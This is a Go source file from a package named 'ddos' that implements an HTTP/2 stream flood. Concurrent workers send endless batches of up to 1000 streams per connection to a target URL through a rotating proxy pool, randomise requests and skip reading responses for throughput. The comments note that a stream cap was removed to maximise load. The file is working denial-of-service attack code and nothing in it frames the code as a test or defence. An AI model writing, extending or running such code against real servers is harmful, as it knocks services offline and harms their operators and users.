package ddos

import (
	"net/http"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// startHTTP2StreamFlood starts HTTP/2 stream flood attack
func (d *DDoSAttack) startHTTP2StreamFlood() {
	d.startHTTP2StreamFloodWorkers(d.config.MaxThreads)
}

// startHTTP2StreamFloodWorkers starts HTTP/2 stream flood workers
func (d *DDoSAttack) startHTTP2StreamFloodWorkers(numWorkers int) {
	// Always use connection pool (required for efficiency)
	pool, err := NewClientPool(d.config)
	if err != nil {
		return
	}
	d.clientPool = pool

	// Create request builder (always enabled with randomization)
	if d.requestBuilder == nil {
		d.requestBuilder = NewRequestBuilder(d.config)
	}

	// Determine target URL (force HTTPS for HTTP/2)
	targetURL := d.config.TargetURL
	if !strings.HasPrefix(targetURL, "https://") {
		if strings.HasPrefix(targetURL, "http://") {
			targetURL = strings.Replace(targetURL, "http://", "https://", 1)
		} else {
			targetURL = "https://" + targetURL
		}
	}

	for i := 0; i < numWorkers; i++ {
		d.wg.Add(1)
		go d.http2StreamFloodWorkerWithPool(pool, targetURL)
	}
}


// http2StreamFloodWorkerWithPool floods server with HTTP/2 streams using connection pool
func (d *DDoSAttack) http2StreamFloodWorkerWithPool(pool *ClientPool, targetURL string) {
	defer func() {
		// Recover from panics to prevent worker crashes
		if r := recover(); r != nil {
			atomic.AddInt64(&d.requestsFailed, 1)
		}
		d.wg.Done()
	}()

	// Check if context is initialized
	if d.ctx == nil {
		return
	}

	// Create a limiter for nested goroutines - use MaxStreamsPerConn directly
	// Removed artificial 50 stream cap for maximum throughput
	maxConcurrentStreams := d.config.MaxStreamsPerConn
	if maxConcurrentStreams <= 0 {
		maxConcurrentStreams = 1000 // Default if not set
	}
	limiter := NewGoroutineLimiter(maxConcurrentStreams)
	defer limiter.Close()

	for {
		select {
		case <-d.ctx.Done():
			return
		default:
			// Create streams concurrently with goroutine limiting
			atomic.AddInt64(&d.totalBatches, 1)
			var wg sync.WaitGroup
			var successCount int64 // Use atomic for thread-safe access

			// Use MaxStreamsPerConn directly without artificial cap
			streamsToCreate := d.config.MaxStreamsPerConn
			if streamsToCreate <= 0 {
				streamsToCreate = 1000 // Default if not set
			}

			for i := 0; i < streamsToCreate; i++ {
				wg.Add(1)
				limiter.Execute(func() {
					defer wg.Done()
					
					// Recover from panics in stream goroutines
					defer func() {
						if r := recover(); r != nil {
							atomic.AddInt64(&d.requestsFailed, 1)
						}
					}()

					client := pool.GetClient()
					if client == nil {
						return
					}

					// Ensure requestBuilder is initialized
					if d.requestBuilder == nil {
						d.requestBuilder = NewRequestBuilder(d.config)
					}
					
					// Safe type assertion
					rb, ok := d.requestBuilder.(*RequestBuilder)
					if !ok || rb == nil {
						atomic.AddInt64(&d.requestsFailed, 1)
						return
					}
					
					req, err := rb.BuildRequest()
					if err != nil {
						atomic.AddInt64(&d.requestsFailed, 1)
						return
					}

					// Rate limiting: check if request is allowed
					if d.rateLimiter != nil && !d.rateLimiter.Allow() {
						atomic.AddInt64(&d.requestsFailed, 1)
						return
					}

					proxyURL := pool.GetProxyForClient(client)
					success := d.sendHTTP2StreamRequestWithClient(client, req, proxyURL)
					if success {
						atomic.AddInt64(&successCount, 1)
					}
				})
			}
			wg.Wait()

			if atomic.LoadInt64(&successCount) > 0 {
				atomic.AddInt64(&d.successfulBatches, 1)
			}
		}
	}
}


// sendHTTP2StreamRequestWithClient sends a request using the provided client (for pool-based workers)
func (d *DDoSAttack) sendHTTP2StreamRequestWithClient(client *http.Client, req *http.Request, proxyURL string) bool {
	atomic.AddInt64(&d.activeConns, 1)
	defer atomic.AddInt64(&d.activeConns, -1)

	req = req.WithContext(d.ctx)

	startTime := time.Now()
	atomic.AddInt64(&d.requestsSent, 1)

	resp, err := client.Do(req)
	responseTime := time.Since(startTime)
	
	if err != nil {
		atomic.AddInt64(&d.requestsFailed, 1)
		if proxyURL != "" {
			d.markProxyFailure(proxyURL)
		}
		return false
	}
	defer resp.Body.Close()

	// Always skip response reading for maximum efficiency
	resp.Body.Close()

	atomic.AddInt64(&d.totalResponseTime, int64(responseTime))
	atomic.AddInt64(&d.requestsSuccess, 1)
	
	if proxyURL != "" {
		d.markProxySuccess(proxyURL, responseTime)
	}

	return true
}

